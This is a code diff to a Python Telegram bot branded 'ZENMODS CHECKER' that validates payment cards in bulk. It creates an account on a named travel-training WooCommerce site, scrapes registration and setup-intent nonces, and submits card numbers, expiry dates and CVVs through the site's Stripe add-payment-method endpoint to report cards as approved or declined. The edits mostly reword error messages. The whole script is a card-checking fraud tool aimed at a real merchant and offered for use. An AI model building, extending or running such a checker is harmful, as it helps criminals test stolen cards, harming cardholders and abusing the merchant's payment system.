@@ -67,7 +67,7 @@ def create_session():
         }
         response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
         if response.status_code != 200:
-            return None, f"Register GET status code: {response.status_code}"
+            return None, f"[SITE SIDE ISSUE] Register GET failed with status {response.status_code}"
             
         html = response.text
         soup = BeautifulSoup(html, 'html.parser')
@@ -76,7 +76,7 @@ def create_session():
         noncee_tag = soup.find('input', {'id': 'woocommerce-register-nonce'})
         
         if not nonce_tag or not noncee_tag:
-            return None, "Nonce input fields not found in HTML structure"
+            return None, "[SITE SIDE ISSUE] Registration form nonces missing or blocked by target site WAF/Security."
             
         nonce = nonce_tag['value']
         noncee = noncee_tag['value']
@@ -121,9 +121,9 @@ def create_session():
         if response.status_code == 200:
             return session, "Success"
         else:
-            return None, f"Register POST status code: {response.status_code}"
+            return None, f"[SITE SIDE ISSUE] Register POST failed with status {response.status_code}"
     except Exception as e:
-        return None, str(e)
+        return None, f"[SITE/NETWORK ISSUE] Exception during session creation -> {str(e)}"
 
 def save_session_to_file(session, file_path):
     with open(file_path, "w") as file:
@@ -159,7 +159,7 @@ def check_single_cc(cc_line, session):
         card = cc_line.replace('/', '|')
         lista = card.split("|")
         if len(lista) < 4:
-            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\nProblem Detail: Invalid format structure (Expected card|mm|yy|cvv)"
+            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\n[FORMAT ERROR] Invalid card format structure"
         
         cc = lista[0]
         mm = lista[1]
@@ -176,10 +176,13 @@ def check_single_cc(cc_line, session):
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
         }
         response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', headers=headers, timeout=20)
+        if response.status_code != 200:
+            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\n[SITE SIDE ISSUE] Failed to load payment page (Status: {response.status_code})"
+            
         html = response.text
         nonce_match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html)
         if not nonce_match:
-            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nProblem Detail: Nonce extraction failed. Account page might require re-authentication or session expired."
+            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\n[SITE SIDE ISSUE] Setup intent nonce not found on site. Session might have expired."
         nonce = nonce_match.group(1)
 
         headers_stripe = {
@@ -207,17 +210,15 @@ def check_single_cc(cc_line, session):
             try:
                 error = stripe_response.json()['error']['message']
             except Exception:
-                error = "Unknown Stripe Tokenization Error"
+                error = "Unknown Stripe Error"
             
-            if 'code' in error:
-                return f"ZENMODS CHECKER ⚡\nCCN ✅\n{card}\nProblem Detail: Card requires security code or authentication challenge -> {error}"
-            else:
-                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nProblem Detail: Stripe Declined -> {error}"
+            # API / Gateway Level Issue Identification
+            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\n[API / GATEWAY ISSUE] Stripe responded with error: {error}"
         else:
             try:
                 iddd = stripe_response.json()['id']
             except Exception:
-                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nProblem Detail: Payment method ID extraction failed from Stripe response."
+                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\n[API ISSUE] Failed to extract payment method ID from Stripe response."
 
             headers_confirm = {
                 'authority': 'www.thetravelinstitute.com',
@@ -243,18 +244,15 @@ def check_single_cc(cc_line, session):
             try:
                 res_json = confirm_response.json()
             except Exception:
-                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nProblem Detail: Invalid confirmation response from website server."
+                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\n[SITE SIDE ISSUE] Invalid AJAX confirmation JSON response from site."
 
             if res_json.get('success') == False:
                 error = res_json.get('data', {}).get('error', {}).get('message', 'Unknown confirmation error')
-                if 'code' in error:
-                    return f"ZENMODS CHECKER ⚡\nCCN ✅\n{card}\nProblem Detail: Confirmation error code -> {error}"
-                else:
-                    return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nProblem Detail: Confirmation declined -> {error}"
+                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\n[SITE/API GATEWAY ISSUE] Setup intent confirmation failed: {error}"
             else:
-                return f"ZENMODS CHECKER ⚡\nApproved ✅\n{card}\nProblem Detail: None. Successfully approved!"
+                return f"ZENMODS CHECKER ⚡\nApproved ✅\n{card}\n[SUCCESS] Setup intent confirmed successfully!"
     except Exception as e:
-        return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\nProblem Detail: Exception caught -> {str(e)}"
+        return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\n[NETWORK / SCRIPT EXCEPTION] -> {str(e)}"
 
 def process_bulk_file(chat_id, file_content):
     lines = [line.strip() for line in file_content.decode("utf-8").splitlines() if line.strip()]
@@ -264,21 +262,21 @@ def process_bulk_file(chat_id, file_content):
         bot.send_message(chat_id, "⚠️ File is empty or no cards found!")
         return
 
-    bot.send_message(chat_id, f"⚡ **Zenmods Detailed Diagnostic Engine** ⚡\nTotal cards: `{total_cards}`.\n🚀 Initializing session and checking...")
+    bot.send_message(chat_id, f"⚡ **Zenmods Smart Diagnostic Engine** ⚡\nTotal cards: `{total_cards}`.\n🚀 Checking one by one with deep error tracing...")
 
     session, session_status = manage_session_file()
     if not session:
-        bot.send_message(chat_id, f"❌ **Session creation failed!**\n\n🔍 **Diagnostic Reason:** `{session_status}`")
+        bot.send_message(chat_id, f"❌ **Session creation failed!**\n\n🔍 **Source Diagnosis:** `{session_status}`")
         return
     else:
-        bot.send_message(chat_id, f"✅ Session established successfully! Status: `{session_status}`")
+        bot.send_message(chat_id, f"✅ Session status: `{session_status}`")
 
     for index, card_line in enumerate(lines, start=1):
         res = check_single_cc(card_line, session)
         bot.send_message(chat_id, f"📌 **Report [{index}/{total_cards}]**:\n\n{res}")
         time.sleep(2)
 
-    bot.send_message(chat_id, "🏁 **Finished checking all cards with problem breakdown!**")
+    bot.send_message(chat_id, "🏁 **All checks completed with full source diagnostics!**")
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
@@ -309,10 +307,10 @@ def handle_single_card_cmd(message):
         return
     
     card_line = parts[1].strip()
-    bot.send_message(chat_id, "🔍 Checking single card with diagnostics...")
+    bot.send_message(chat_id, "🔍 Running single card diagnosis...")
     session, session_status = manage_session_file()
     if not session:
-        bot.send_message(chat_id, f"❌ **Session creation failed!**\n\n🔍 **Diagnostic Reason:** `{session_status}`")
+        bot.send_message(chat_id, f"❌ **Session failed!**\n\n🔍 **Source Diagnosis:** `{session_status}`")
         return
     
     res = check_single_cc(card_line, session)
